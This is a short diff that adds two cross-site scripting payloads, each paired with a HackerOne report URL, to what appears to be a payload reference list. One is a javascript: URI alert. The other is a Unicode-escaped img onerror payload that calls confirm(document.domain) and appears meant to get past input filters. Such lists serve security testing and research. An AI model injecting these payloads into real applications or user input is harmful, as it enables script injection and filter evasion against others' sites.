@@ -1,0 +1,4 @@
+https://hackerone.com/reports/1940245 | javascript:alert(90)
+https://hackerone.com/reports/1363001 | \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e | unicode escapse sequence charecter
+
+
